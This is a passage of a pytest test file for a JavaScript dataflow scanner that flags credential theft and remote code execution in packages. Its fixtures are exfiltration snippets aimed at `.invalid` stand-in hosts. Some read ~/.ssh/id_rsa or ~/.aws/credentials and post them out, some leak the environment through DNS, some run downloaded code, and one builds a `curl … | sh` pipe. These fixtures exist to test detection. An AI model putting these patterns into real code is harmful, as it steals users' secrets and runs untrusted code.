"""Where a JavaScript file's sensitive values go (`detect/js_flow.py`).

Fixtures name hosts under `.invalid` and assemble command words, so the repository's own scan has
nothing to report in them.
"""

from __future__ import annotations

import time
from typing import ClassVar

import pytest

from cordon_scanner.analysis.javascript.js_flow import JsFlow, _Analysis


class FlowKit:
    @staticmethod
    def flows(text: str) -> list[tuple[list[str], str, str]]:
        return [(sorted(f.sources), f.sink, f.destination) for f in JsFlow.flows(text)]


class TestSources:
    def test_a_credential_file_through_two_helpers(self) -> None:
        text = (
            'const fs = require("fs");\n'
            "function load(p) { return fs.readFileSync(p); }\n"
            'function enc(x) { return Buffer.from(x).toString("base64"); }\n'
            'function send(d) { return require("axios").post("https://a.invalid/u", {d}); }\n'
            'const p = require("path").join(require("os").homedir(), ".aws", "credentials");\n'
            "send(enc(load(p)));\n"
        )
        assert (["home_file", "secret_file"], "request", "fixed") in FlowKit.flows(text)

    def test_a_file_read_in_a_callback(self) -> None:
        text = (
            'const fs = require("fs"); const https = require("https");\n'
            'fs.readFile(process.env.HOME + "/.npmrc", "utf8", (err, txt) => {\n'
            '  const req = https.request({hostname: "h.invalid", method: "POST"});\n'
            "  req.write(txt); req.end();\n"
            "});\n"
        )
        assert any("secret_file" in s for s, _, _ in FlowKit.flows(text))

    def test_a_key_handed_to_a_function_as_private_key(self) -> None:
        text = (
            "export async function createWallet(privateKey) {\n"
            '  await fetch("https://api.invalid/log", {method: "POST", body: privateKey});\n'
            "}\n"
        )
        assert FlowKit.flows(text) == [(["wallet_key"], "request", "fixed")]

    def test_the_whole_environment_in_a_lookup(self) -> None:
        text = (
            'const dns = require("dns");\n'
            'const h = Buffer.from(JSON.stringify(process.env)).toString("hex") + ".x.invalid";\n'
            "dns.lookup(h, () => {});\n"
        )
        assert FlowKit.flows(text) == [(["environment"], "dns", "unknown")]


class TestRemoteCode:
    def test_a_reply_run_through_vm_under_another_name(self) -> None:
        text = (
            'var salt = require("https"); var mk = require("vm");\n'
            'salt.request("https://x.invalid/p", {}, (res) => {\n'
            '  let body = "";\n'
            '  res.on("data", (p) => body += p);\n'
            '  res.on("end", () => mk.runInContext(body, mk.createContext({})));\n'
            "});\n"
        )
        assert (["network_response"], "execute", "unknown") in FlowKit.flows(text)

    def test_a_promise_chain_into_new_function(self) -> None:
        text = 'const axios = require("axios");\naxios.get("https://x.invalid/s").then(r => { new Function(r.data)(); });\n'
        assert (["network_response"], "execute", "unknown") in FlowKit.flows(text)

    def test_a_reply_that_is_only_parsed_is_quiet(self) -> None:
        text = 'async function go() {\n  const r = await fetch("https://api.invalid/x");\n  console.log(await r.json());\n}\n'
        assert FlowKit.flows(text) == []

    def test_a_reply_as_an_argument_to_a_fixed_program_is_not_run(self) -> None:
        # execFileSync("taskkill", [pid]): taskkill runs its own code; the reply is data handed to
        # it, not code it runs. Two Open VSX extensions blocked here (review 98).
        text = (
            'const cp = require("child_process"); const https = require("https");\n'
            'https.get("https://x.invalid/p", (res) => {\n'
            '  let b = ""; res.on("data", (p) => b += p);\n'
            '  res.on("end", () => cp.execFileSync("taskkill", ["/PID", b]));\n'
            "});\n"
        )
        assert not any(sink == "process" for _, sink, _ in FlowKit.flows(text))

    def test_a_reply_as_the_script_of_an_interpreter_is_run(self) -> None:
        # execFile("node", [reply]): node runs the script named after it, so the reply is code.
        text = (
            'const cp = require("child_process"); const https = require("https");\n'
            'https.get("https://x.invalid/p", (res) => {\n'
            '  let b = ""; res.on("data", (p) => b += p);\n'
            '  res.on("end", () => cp.execFile("node", [b]));\n'
            "});\n"
        )
        assert (["network_response"], "process", "unknown") in FlowKit.flows(text)


class TestADecodedValueRun:
    """A decoded blob reaching a run is the decoded-content dropper; a constant run beside an
    unrelated decode is not. `safe_spawn_lines` marks the latter so the decode composites drop it."""

    def test_a_decoded_string_executed_is_found(self) -> None:
        text = 'const cp = require("child_process");\ncp.exec(atob("ZWNobyBoaQ=="));\n'
        assert (["decoded"], "process", "unknown") in FlowKit.flows(text)

    def test_a_base64_buffer_spawned_is_found(self) -> None:
        text = (
            'const cp = require("child_process");\n'
            'function go(x) { cp.spawn(Buffer.from(x, "base64").toString()); }\n'
        )
        assert (["decoded"], "process", "unknown") in FlowKit.flows(text)

    def test_a_decoded_payload_written_then_run_is_found(self) -> None:
        text = (
            'const cp = require("child_process"); const fs = require("fs");\n'
            'const p = require("os").tmpdir() + "/x";\n'
            'const d = atob("ZWNobyBoaQ=="); fs.writeFileSync(p, d);\n'
            'cp.execFile("node", [p]);\n'
        )
        assert (["decoded"], "process", "unknown") in FlowKit.flows(text)

    def test_a_constant_tool_spawn_beside_an_unrelated_decode_is_safe(self) -> None:
        # The common.mjs shape: a discovered interpreter run with literal args, and a screenshot
        # decode that never reaches it. The spawns are source-free, so they are "safe" -- which the
        # decode composites read as "cannot be running the decoded value".
        text = (
            'const cp = require("child_process");\n'
            'const PY = cp.execFileSync("which", ["python3"]).toString().trim();\n'
            'const FF = cp.execFileSync(PY, ["-c", "import imageio_ffmpeg"]).toString();\n'
            "async function shot(cdp) {\n"
            '  const { data } = await cdp.send("Page.captureScreenshot");\n'
            '  return Buffer.from(data, "base64");\n'
            "}\n"
        )
        assert JsFlow.safe_spawn_lines(text) == frozenset({2, 3})
        assert not any(sources == ["decoded"] for sources, _, _ in FlowKit.flows(text))

    def test_a_decoded_run_is_not_safe(self) -> None:
        text = 'const cp = require("child_process");\ncp.exec(atob("ZWNobyBoaQ=="));\n'
        assert JsFlow.safe_spawn_lines(text) == frozenset()


class TestQuiet:
    def test_a_client_sending_its_own_token(self) -> None:
        text = (
            'const axios = require("axios");\nconst token = process.env.GITHUB_TOKEN;\n'
            'module.exports = (q) => axios.get("https://api.github.com/search?q=" + q, {headers: {Authorization: token}});\n'
        )
        assert FlowKit.flows(text) == []

    def test_a_config_file_in_the_project(self) -> None:
        text = 'const fs = require("fs");\nconst cfg = JSON.parse(fs.readFileSync("./config.json"));\nfetch(cfg.url, {body: JSON.stringify(cfg)});\n'
        assert FlowKit.flows(text) == []


class TestDestinations:
    def test_known_drop_points_bare_addresses_and_private_ranges(self) -> None:
        assert _Analysis.classify("https://webhook.site/abc")[1] == "drop"
        assert _Analysis.classify("https://discord.com/api/webhooks/1/x")[1] == "drop"
        assert _Analysis.classify("https://discord.com/app")[1] == "fixed"
        assert _Analysis.classify("http://203.0.113.9/x")[1] == "ip"
        assert _Analysis.classify("http://127.0.0.1:9222/json")[1] == "fixed"
        assert _Analysis.classify("plain text mentioning toast.js")[1] == "unknown"


class TestSpellings:
    """The same flow however the module, the call or the URL is written (review 98, 21-DATAFLOW
    D1). Each case was missed before."""

    SEND = 'fetch("https://a.invalid/u", {method: "POST", body: %s});\n'
    CASES: ClassVar[dict[str, str]] = {
        "tsc call": 'const os_1 = require("os");\n' + SEND % "(0, os_1.hostname)()",
        "tsc import helper": 'const os_1 = __importDefault(require("os"));\n'
        + SEND % "os_1.default.hostname()",
        "esbuild": 'var import_os = __toESM(require("os"));\n'
        + SEND % "import_os.default.hostname()",
        "destructured require": 'const { hostname } = require("os");\n' + SEND % "hostname()",
        "ES named import": 'import { hostname as h } from "os";\n' + SEND % "h()",
        "class method": 'const os = require("os");\n'
        "class T { a() { return os.hostname(); } b() { "
        + SEND.strip() % "this.a()"
        + " } }\nnew T().b();\n",
        "instance field": 'const os = require("os");\n'
        "class T { constructor() { this.h = os.hostname(); } b() { "
        + SEND.strip() % "this.h"
        + " } }\n",
        "template URL": 'const os = require("os");\nfetch(`https://a.invalid/u?h=${os.hostname()}`);\n',
        "client instance": 'const axios = require("axios"); const os = require("os");\n'
        'const c = axios.create({baseURL: "https://a.invalid"});\nc.post("/u", {h: os.hostname()});\n',
        "chained end": 'const https = require("https"); const os = require("os");\n'
        'https.request({hostname: "a.invalid", method: "POST"}).end(os.hostname());\n',
        "destructured file read": 'const { readFileSync } = require("fs");\n'
        + SEND % 'readFileSync(require("os").homedir() + "/.npmrc")',
    }

    @pytest.mark.parametrize("name", sorted(CASES))
    def test_followed(self, name: str) -> None:
        assert any(
            sink == "request" and sources for sources, sink, _ in FlowKit.flows(self.CASES[name])
        )

    def test_template_text_is_not_code(self) -> None:
        # `//` inside the template's text no longer hides what follows it on the line.
        text = 'const os = require("os");\nconst u = `https://a.invalid/${os.hostname()}`;\nfetch(u);\n'
        assert FlowKit.flows(text) == [(["identity"], "request", "unknown")]

    def test_quiet_when_nothing_sensitive_is_carried(self) -> None:
        text = (
            'const path_1 = __importDefault(require("path"));\n'
            "class T { a() { return path_1.default.join('a', 'b'); } b() { "
            + self.SEND.strip() % "`${this.a()}/x`"
            + " } }\n"
        )
        assert FlowKit.flows(text) == []


class TestSockets:
    """What is written to a raw socket (net, tls, dgram) leaves as it is: the `connection` sink
    the raw-channel rules read. Every such write was a `request`, and `new net.Socket()` was no
    sink at all, so those rules could not fire on a socket (review 98, 2026-10-20)."""

    HEAD = 'const os = require("os");\nconst net = require("net"); const tls = require("tls");\n'
    RAW: ClassVar[dict[str, str]] = {
        "bound": 'const s = net.connect(9, "h.invalid");\ns.write(os.hostname());\n',
        "chained": 'net.connect(9, "h.invalid").write(os.hostname());\n',
        "createConnection": 'net.createConnection(9, "h.invalid").end(os.hostname());\n',
        "in the connect callback": (
            'const s = net.connect(9, "h.invalid", () => { s.write(os.hostname()); });\n'
        ),
        "tls": 'const s = tls.connect(443, "h.invalid");\ns.write(os.hostname());\n',
        "new Socket": (
            'const s = new net.Socket();\ns.connect(9, "h.invalid");\ns.write(os.hostname());\n'
        ),
    }

    @pytest.mark.parametrize("name", sorted(RAW))
    def test_a_raw_socket_write_is_a_connection(self, name: str) -> None:
        assert FlowKit.flows(self.HEAD + self.RAW[name])[0][:2] == (["identity"], "connection")

    def test_an_http_request_is_still_a_request(self) -> None:
        text = (
            'const os = require("os"); const https = require("https");\n'
            'https.request({hostname: "h.invalid"}).end(os.hostname());\n'
        )
        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")

    #: What opening an HTTP request sends -- its path, query, headers -- is a request too: read
    #: as a raw socket, a licence check sending a key in its query string was a payload's channel
    #: (review 98 P1 A/B, 2026-10-20).
    OPENS: ClassVar[dict[str, str]] = {
        "request options": 'https.request({hostname: "h.invalid", path: "/l?k=" + os.hostname()});\n',
        "get URL": 'http.get("http://h.invalid/l?k=" + os.hostname());\n',
        "required inline": 'require("https").get("https://h.invalid/l?k=" + os.hostname());\n',
    }

    @pytest.mark.parametrize("name", sorted(OPENS))
    def test_what_opening_an_http_request_sends_is_a_request(self, name: str) -> None:
        text = (
            'const os = require("os");\n'
            'const http = require("http"); const https = require("https");\n' + self.OPENS[name]
        )
        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")

    @pytest.mark.parametrize("host", ["127.0.0.1", "localhost", "::1"])
    def test_a_socket_to_this_machine_is_not_a_channel(self, host: str) -> None:
        text = self.HEAD + f'net.createConnection(9, "{host}").write(os.hostname());\n'
        assert FlowKit.flows(text)[0][:2] == (["identity"], "request")


class TestIdentityAsDestination:
    """The machine's own name or address as where a call goes -- a socket bound to the host's
    name, a printer scan, NAT-PMP to the gateway, a router's own API -- is not identity sent
    (review 98 P1 A/B: five benign tools). In a path, a body or a name's labels it still is."""

    HEAD = (
        'const os = require("os"); const dns = require("dns"); const net = require("net");\n'
        'const dgram = require("dgram"); const http = require("http");\n'
        "const ip = os.networkInterfaces().en0[0].address;\n"
    )
    DESTINATIONS: ClassVar[dict[str, str]] = {
        "own name looked up": "dns.lookup(os.hostname(), (e, a) => {});\n",
        "socket host option": "net.connect({host: ip, port: 9100});\n",
        "socket shorthand": "const host = ip;\nnet.connect({host, port: 9100});\n",
        "socket positional": "net.connect(9100, ip);\n",
        "datagram address": 'const s = dgram.createSocket("udp4");\ns.send(Buffer.from("x"), 5351, ip);\n',
        "request hostname": 'http.request({hostname: ip, path: "/tr064"});\n',
        "local address": 'http.request({host: "h.invalid", localAddress: ip});\n',
        "interfaces walked": (
            "const ifs = os.networkInterfaces();\n"
            "for (const name of Object.keys(ifs)) {\n"
            "  for (const i of ifs[name]) { net.connect({host: i.address, port: 631}); }\n"
            "}\n"
        ),
        "destructured": (
            "const { address } = os.networkInterfaces().en0[0];\nnet.connect(9100, address);\n"
        ),
    }
    SENT: ClassVar[dict[str, str]] = {
        "name labels": 'dns.lookup(os.hostname() + ".x.invalid", () => {});\n',
        "name labels in a template": "dns.lookup(`${os.hostname()}.x.invalid`, () => {});\n",
        "path": 'http.request({hostname: "h.invalid", path: "/p?h=" + os.hostname()});\n',
        "hostname labels": 'http.request({hostname: os.hostname() + ".x.invalid"});\n',
        # How a DNS beacon is usually written: its name built first, then handed over bare.
        "name built first": 'const h = os.hostname() + ".x.invalid";\ndns.lookup(h, () => {});\n',
        "name built in a template": "const h = `${os.hostname()}.x.invalid`;\ndns.lookup(h, () => {});\n",
        "name joined": (
            'const n = [os.userInfo().username, os.hostname(), "x", "invalid"].join(".");\n'
            "dns.resolve(n, () => {});\n"
        ),
        "name joined by a variable": (
            "const parts = [os.userInfo().username, os.hostname()];\n"
            "const n = parts.join(sep);\ndns.resolve(n, () => {});\n"
        ),
        "name through two bindings": (
            'const a = os.hostname() + ".x.invalid"; const b = a;\ndns.lookup(b, () => {});\n'
        ),
        "name appended to": 'let h = os.hostname();\nh += ".x.invalid";\ndns.lookup(h, () => {});\n',
        "name built by a helper": (
            'function d(x) { return x + ".x.invalid"; }\ndns.lookup(d(os.hostname()), () => {});\n'
        ),
        "name passed in": (
            'function ping(h) { dns.lookup(h, () => {}); }\nping(os.hostname() + ".x.invalid");\n'
        ),
        "socket write": 'const s = net.connect(9, "h.invalid");\ns.write(os.hostname());\n',
        "datagram payload": (
            'const s = dgram.createSocket("udp4");\n'
            's.send(Buffer.from(os.hostname()), 53, "h.invalid");\n'
        ),
        "request body": (
            'const r = http.request({hostname: "h.invalid"});\n'
            "r.end(JSON.stringify({h: os.hostname()}));\n"
        ),
    }

    @pytest.mark.parametrize("name", sorted(DESTINATIONS))
    def test_where_a_call_goes_is_not_sent(self, name: str) -> None:
        flows = FlowKit.flows(self.HEAD + self.DESTINATIONS[name])
        assert not [f for f in flows if "identity" in f[0]]

    @pytest.mark.parametrize("name", sorted(SENT))
    def test_what_a_call_carries_is_sent(self, name: str) -> None:
        flows = FlowKit.flows(self.HEAD + self.SENT[name])
        assert [f for f in flows if "identity" in f[0]]


class TestWhereAResponseGoes:
    """What a server sent reaches a child process only through what it was stored in. Each
    benign shape below let one response reach every command a file runs (review 98 P1 A/B: the
    D1 dataflow's REMOTE_CODE blocks on benign tools); each positive still reaches it."""

    HEAD = 'const cp = require("child_process"); const fs = require("fs");\n'
    GET = 'fetch("https://h.invalid/x").then(r => r.text())'
    APART: ClassVar[dict[str, str]] = {
        # TypeScript's annotations hid every function, so a file was one scope.
        "typed functions": (
            f"async function load(): Promise<string> {{ const pid = await {GET}; return pid; }}\n"
            "function parent(): string {\n"
            '  let pid = process.ppid; return cp.spawnSync("ps", ["-p", String(pid)]).stdout;\n'
            "}\n"
        ),
        "typed arrows": (
            f"const load = async (u: string): Promise<string> => {{ const out = await {GET}; return out; }};\n"
            'const ps = (p: number): void => { const out = String(p); cp.spawnSync("ps", ["-p", out]); };\n'
        ),
        # A runtime object stored into is not the file's own value.
        "process stored into": (
            f"async function check() {{ const ok = await {GET}; process.exitCode = ok ? 0 : 1; }}\n"
            'cp.spawnSync("ps", ["-p", String(process.ppid)]);\n'
        ),
        "a log opened to write": (
            f"async function f() {{ const body = await {GET};\n"
            '  const log = fs.openSync("x.log", "a"); fs.writeSync(log, body);\n'
            '  cp.spawn(process.execPath, ["cli.js"], { stdio: ["ignore", log, log] }); }\n'
        ),
        # Each class's `this` is its own instance.
        "two classes": (
            f"class A {{ async load() {{ this.data = await {GET}; }} }}\n"
            'class B { constructor() { this.data = "ls"; } run() { cp.exec(this.data); } }\n'
        ),
        "two classes, one method name": (
            f"class A {{ get() {{ return {GET}; }} use() {{ return this.get(); }} }}\n"
            'class B { get() { return "ls"; } run() { cp.exec(this.get()); } }\n'
        ),
    }
    REACHES: ClassVar[dict[str, str]] = {
        "two thens": f"{GET}.then(t => cp.exec(t));\n",
        "a typed function": (
            f"async function run(): Promise<void> {{ const t: string = await {GET}; cp.exec(t); }}\n"
        ),
        "one class's field": (
            f"class A {{ async load() {{ this.code = await {GET}; }} run() {{ cp.exec(this.code); }} }}\n"
        ),
        "an arrow in a method": (
            f"class A {{ load() {{ {GET}.then(t => {{ this.code = t; }}); }} run() {{ cp.exec(this.code); }} }}\n"
        ),
        "a typed class": (
            "class A {\n  private code: string = '';\n"
            f"  async load(): Promise<void> {{ this.code = await {GET}; }}\n"
            "  run(): void { cp.exec(this.code); }\n}\n"
        ),
        "prototype methods": (
            f"function C() {{}}\nC.prototype.load = function () {{ this.s = {GET}; }};\n"
            "C.prototype.run = function () { cp.exec(this.s); };\n"
        ),
        "a body joined from chunks": (
            'require("https").get("https://h.invalid/x", res => { const c = [];\n'
            '  res.on("data", d => c.push(d));\n'
            '  res.on("end", () => cp.exec(Buffer.concat(c).toString())); });\n'
        ),
        "a file opened to read": (
            'async function f() { const fd = fs.openSync("x", "r"); '
            f"const t = await {GET}; cp.exec(t); }}\n"
        ),
        # What a promise's executor resolves it with is the promise's value: a download
        # written the usual way, which the shared `Buffer` used to carry by accident.
        "a promise resolved with it": (
            "function download(u) { return new Promise((resolve, reject) => {\n"
            '  require("https").get(u, res => { const c = [];\n'
            '    res.on("data", d => c.push(d)); res.on("end", () => resolve(Buffer.concat(c))); });\n'
            "}); }\n"
            'async function main() { const body = await download("https://h.invalid/x");\n'
            "  cp.exec(body.toString()); }\n"
        ),
        # `new C(x)` gives C's fields what its constructor took.
        "a constructor's argument": (
            "class Runner { constructor(command) { this.command = command; }\n"
            "  start() { cp.exec(this.command); } }\n"
            f"async function main() {{ new Runner(await {GET}).start(); }}\n"
        ),
        "a bundler's class expression": (
            "var Runner = class { constructor(command) { this.command = command; }\n"
            "  start() { cp.exec(this.command); } };\n"
            f"async function main() {{ new Runner(await {GET}).start(); }}\n"
        ),
        "a method's argument": (
            "class Runner { set(command) { this.command = command; } start() { cp.exec(this.command); } }\n"
            f"async function main() {{ const r = new Runner(); r.set(await {GET}); r.start(); }}\n"
        ),
        # A compiled async method runs its body in a generator `__awaiter` binds to `this`.
        "a compiled async method": (
            "class A {\n"
            f"  load() {{ return __awaiter(this, void 0, void 0, function* () {{ this.code = yield {GET}; }}); }}\n"
            "  run() { return __awaiter(this, void 0, void 0, function* () { cp.exec(this.code); }); }\n"
            "}\n"
        ),
    }

    def test_a_regular_expressions_exec_runs_nothing(self) -> None:
        text = (
            'const { exec } = require("child_process"); const fs = require("fs");\n'
            'const t = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");\n'
            "const m = /token=(.*)/.exec(t);\n"
        )
        assert FlowKit.flows(text) == []
        sent = text + 'exec("curl -d " + t);\n'
        assert (["home_file", "secret_file"], "process", "unknown") in FlowKit.flows(sent)

    @staticmethod
    def runs(text: str) -> bool:
        return any(
            "network_response" in s and k in ("process", "execute")
            for s, k, _ in FlowKit.flows(text)
        )

    @pytest.mark.parametrize("name", sorted(APART))
    def test_a_response_stays_where_it_was_stored(self, name: str) -> None:
        assert not self.runs(self.HEAD + self.APART[name])

    @pytest.mark.parametrize("name", sorted(REACHES))
    def test_a_response_run_is_still_found(self, name: str) -> None:
        assert self.runs(self.HEAD + self.REACHES[name])

    def test_typed_parameters_keep_their_positions(self) -> None:
        text = (
            'const os = require("os");\n'
            "function send(tag: string, body: Record<string, any>): void {\n"
            '  fetch("https://h.invalid/u", { method: "POST", body: JSON.stringify(body) });\n'
            "}\n"
            'send("t", { h: os.hostname() });\n'
        )
        assert (["identity"], "request", "fixed") in FlowKit.flows(text)


class TestOpeners:
    """A link the server sent, opened in the desktop's browser (a sign-in page), runs none of
    it: an `open` sink, which the send rules read and the remote-code rule does not."""

    HEAD = (
        'const { exec, spawn } = require("child_process");\nasync function go() {\n'
        'const url = (await (await fetch("https://h.invalid/login")).json()).uri;\n'
    )
    OPENS: ClassVar[dict[str, str]] = {
        "a platform choice": (
            "const p = process.platform;\n"
            'exec(p === "darwin" ? `open "${url}"` : p === "win32" ? `start "" "${url}"`'
            ' : `xdg-open "${url}"`);\n'
        ),
        "a command built first": (
            'const cmd = process.platform === "darwin" ? `open -a "${app}" "${url}"`'
            ' : `xdg-open "${url}"`;\nexec(cmd, () => {});\n'
        ),
        "spawned": 'spawn("xdg-open", [url], { stdio: "ignore" });\n',
        "rundll32": "exec(`rundll32 url.dll,FileProtocolHandler ${url}`);\n",
        "through a helper": ('function ob(u) { exec(`open "${u}"`); }\nob(url);\n'),
    }
    RUNS: ClassVar[dict[str, str]] = {
        "open in a terminal": 'exec(`open -a Terminal "${url}"`);\n',
        "one branch a shell": (
            'exec(process.platform === "darwin" ? `open "${url}"` : `sh -c "${url}"`);\n'
        ),
        "piped to a shell": "exec(`curl -fsSL ${url} | sh`);\n",
        "run as it is": "exec(url);\n",
    }

    @pytest.mark.parametrize("name", sorted(OPENS))
    def test_opening_a_link_is_an_open(self, name: str) -> None:
        flows = FlowKit.flows(self.HEAD + self.OPENS[name] + "}\n")
        assert (["network_response"], "open") in [f[:2] for f in flows]
        assert not [f for f in flows if f[1] == "process"]

    @pytest.mark.parametrize("name", sorted(RUNS))
    def test_running_it_is_a_process(self, name: str) -> None:
        flows = FlowKit.flows(self.HEAD + self.RUNS[name] + "}\n")
        assert (["network_response"], "process") in [f[:2] for f in flows]

    def test_a_secret_in_the_link_is_still_sent(self) -> None:
        from cordon_scanner.detect.code.capability import CapabilityDetector

        text = (
            'const { exec } = require("child_process"); const fs = require("fs");\n'
            'const k = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa");\n'
            'exec(`open "https://h.invalid/?k=${k}"`);\n'
        )
        assert (["home_file", "secret_file"], "open", "unknown") in FlowKit.flows(text)
        sinks = {rule: s for _, rule, s in CapabilityDetector._JS_FLOW_RULES}
        assert "open" in sinks["CAP.JS.FLOW.SECRET_FILE_SENT"]
        assert "open" not in sinks["CAP.JS.FLOW.REMOTE_CODE"]

    def test_the_host_name_in_the_link_is_still_sent(self) -> None:
        from cordon_scanner.detect.code.capability import CapabilityDetector

        text = (
            'const { exec } = require("child_process"); const os = require("os");\n'
            'exec(`open "https://h.invalid/?h=${os.hostname()}"`);\n'
        )
        assert (["identity"], "open", "unknown") in FlowKit.flows(text)
        sinks = {rule: s for _, rule, s in CapabilityDetector._JS_FLOW_RULES}
        assert "open" in sinks["CAP.JS.FLOW.IDENTITY_SENT"]
        assert "open" in sinks["CAP.JS.FLOW.ENVIRONMENT_SENT"]


class TestRequests:
    """`JsFlow.requests`: each request by the URL reaching it. A package installing its own
    platform binary from the registry (esbuild's install.js) makes registry requests only; one
    request anywhere else, or a package name a response chose, is `other`."""

    HELPER = (
        'const https = require("https");\n'
        "function fetch(url) { return new Promise((resolve, reject) => {\n"
        "  https.get(url, res => {\n"
        "    if (res.statusCode === 302) return fetch(res.headers.location).then(resolve, reject);\n"
        '    const c = []; res.on("data", d => c.push(d));\n'
        '    res.on("end", () => resolve(Buffer.concat(c))); }); }); }\n'
    )
    TEMPLATE = (
        "function download(pkg) {\n"
        '  return fetch(`https://registry.npmjs.org/${pkg}/-/${pkg.replace("@x/", "")}-1.0.0.tgz`);\n'
        "}\n"
    )

    @staticmethod
    def kinds(text: str) -> list[str]:
        return [r.kind for r in JsFlow.requests(text)]

    def test_a_registry_install_through_helpers(self) -> None:
        text = self.HELPER + self.TEMPLATE + 'download("@x/" + process.platform);\n'
        requests = JsFlow.requests(text)
        assert {r.kind for r in requests} == {"registry"}
        assert "@x/" in requests[0].parts

    def test_a_request_anywhere_else_is_other(self) -> None:
        text = self.HELPER + self.TEMPLATE + 'download("@x/a");\nfetch("https://h.invalid/p");\n'
        assert "other" in self.kinds(text)

    def test_a_package_a_response_named_is_other(self) -> None:
        text = (
            self.HELPER
            + self.TEMPLATE
            + 'async function go() { download(await fetch("https://h.invalid/name")); }\n'
        )
        assert "registry" not in self.kinds(text)

    def test_a_helper_nothing_here_calls_is_other(self) -> None:
        assert "other" in self.kinds(self.HELPER + "module.exports = fetch;\n")

    def test_a_literal_registry_url(self) -> None:
        text = 'require("https").get("https://registry.npmjs.org/@x/a/-/a-1.0.0.tgz", r => {});\n'
        assert self.kinds(text) == ["registry"]


class TestCensusSpellings:
    """Study-half misses the P3 census found carrying a payload a rule could see, in spellings
    the dataflow did not follow (review 98 P4). Each positive is followed; each benign twin stays
    quiet."""

    REACHED: ClassVar[dict[str, tuple[str, tuple[list[str], str]]]] = {
        "identity command through a helper": (
            'const cp = require("child_process");\n'
            'function send(p) { fetch("https://h.invalid/w?" + p).catch(() => {}); }\n'
            'const who = cp.execSync("who" + "ami", {encoding: "utf8"}).trim();\n'
            'send("u=" + encodeURIComponent(who));\n',
            (["identity"], "request"),
        ),
        "identity command's callback": (
            'const { exec } = require("child_process");\n'
            'exec("uname -a", (e, out) => { require("https").get("https://h.invalid/?u=" + out); });\n',
            (["identity"], "request"),
        ),
        "a computed os member": (
            'const os = require("os");\nfetch("https://h.invalid/?h=" + os["host" + "name"]());\n',
            (["identity"], "request"),
        ),
        "a Telegram bot sending a file": (
            'const { Telegraf } = require("telegraf"); const fs = require("fs");\n'
            "const bot = new Telegraf(TOKEN);\n"
            'bot.telegram.sendDocument(CHAT, { source: fs.readFileSync(process.env.HOME + "/.npmrc") });\n',
            (["home_file", "secret_file"], "request"),
        ),
        "a Discord webhook client": (
            'const { WebhookClient } = require("discord.js"); const os = require("os");\n'
            "const hook = new WebhookClient({ url: U });\nhook.send(os.hostname());\n",
            (["identity"], "request"),
        ),
        "a static method's sink": (
            'const cp = require("child_process");\n'
            "class W { static start(p) { cp.execFile(p, []); } }\n"
            'async function go() { W.start(await (await fetch("https://h.invalid/x")).text()); }\n',
            (["network_response"], "process"),
        ),
    }
    QUIET: ClassVar[dict[str, str]] = {
        "an identity command printed": (
            'const cp = require("child_process");\nconsole.log(cp.execSync("whoami").toString());\n'
        ),
        "another command's output sent": (
            'const cp = require("child_process");\nconst d = cp.execSync("git diff").toString();\n'
            'fetch("https://api.invalid/review", { method: "POST", body: d });\n'
        ),
        "a bot replying": (
            'const { Telegraf } = require("telegraf");\nconst bot = new Telegraf(process.env.BOT_TOKEN);\n'
            'bot.on("text", c => bot.telegram.sendMessage(c.chat.id, "hi " + c.from.first_name));\n'
        ),
        "a secret written, then its path logged": (
            'const fs = require("fs"); const k = fs.readFileSync(process.env.HOME + "/.npmrc");\n'
            'const p = "/tmp/k"; fs.writeFileSync(p, k); fetch("https://h.invalid/log?p=" + p);\n'
        ),
        "a config downloaded, another program run": (
            'const fs = require("fs"); const cp = require("child_process");\n'
            'async function go() { const c = await (await fetch("https://h.invalid/c")).text();\n'
            '  const p = "cfg.json"; fs.writeFileSync(p, c); cp.execFileSync("ls", ["-l"]); }\n'
        ),
    }

    @pytest.mark.parametrize("name", sorted(REACHED))
    def test_reached(self, name: str) -> None:
        text, want = self.REACHED[name]
        assert want in [f[:2] for f in FlowKit.flows(text)]

    @pytest.mark.parametrize("name", sorted(QUIET))
    def test_quiet(self, name: str) -> None:
        reported = {
            ("identity", "request"),
            ("secret_file", "request"),
            ("home_file", "request"),
            ("network_response", "process"),
            ("network_response", "execute"),
        }
        flows = FlowKit.flows(self.QUIET[name])
        assert not [f for f in flows for s in f[0] if (s, f[1]) in reported]


class TestBounds:
    def test_a_large_generated_file_finishes(self) -> None:
        text = "".join(f"function f{i}(a) {{ return g{i}(a) + {i}; }}\n" for i in range(20_000))
        assert JsFlow.flows(text) == []

    def test_templates_nested_past_the_limit_finish(self) -> None:
        deep = "x = " + "`a${" * 5_000 + "1" + "}`" * 5_000 + ";\n"
        started = time.monotonic()
        assert JsFlow.flows(deep) == []
        assert time.monotonic() - started < 5


class TestArchiveThenSend:
    """An archive built over local files carries what a read of them gives (home_file/secret_file),
    and is read where the archive is sent -- `.toBuffer()`/`.generateAsync()` carry the archive's
    taint through the `zip` reference. A project dir or a local write stays quiet (review 98 P4)."""

    SENT: ClassVar[dict[str, tuple[str, list[str]]]] = {
        "AdmZip homedir -> https.request": (
            'const AdmZip = require("adm-zip");\nconst os = require("os");\n'
            "const zip = new AdmZip();\nzip.addLocalFolder(os.homedir());\n"
            'require("https").request({ hostname: "h.invalid" }).end(zip.toBuffer());\n',
            ["home_file"],
        ),
        "AdmZip .ssh file -> https.request": (
            'const AdmZip = require("adm-zip");\nconst os = require("os");\nconst path = require("path");\n'
            'const zip = new AdmZip();\nzip.addLocalFile(path.join(os.homedir(), ".ssh/id_rsa"));\n'
            'require("https").request({ hostname: "h.invalid" }).end(zip.toBuffer());\n',
            ["home_file", "secret_file"],
        ),
        "JSZip readFileSync(secret) -> fetch": (
            'const JSZip = require("jszip");\nconst fs = require("fs");\n'
            'const os = require("os");\nconst path = require("path");\n'
            'const zip = new JSZip();\nzip.file("c", fs.readFileSync(path.join(os.homedir(), ".aws/credentials")));\n'
            'async function go() {\n  const b = await zip.generateAsync({ type: "nodebuffer" });\n'
            '  await fetch("https://h.invalid/u", { method: "POST", body: b });\n}\n',
            ["home_file", "secret_file"],
        ),
        "archiver directory(home) -> fetch": (
            'const archiver = require("archiver");\nconst os = require("os");\n'
            'const a = archiver("zip");\na.directory(os.homedir(), false);\na.finalize();\n'
            'fetch("https://h.invalid/u", { method: "POST", body: a });\n',
            ["home_file"],
        ),
    }
    QUIET: ClassVar[dict[str, str]] = {
        "a project dir zipped and uploaded": (
            'const AdmZip = require("adm-zip");\nconst zip = new AdmZip();\nzip.addLocalFolder("./dist");\n'
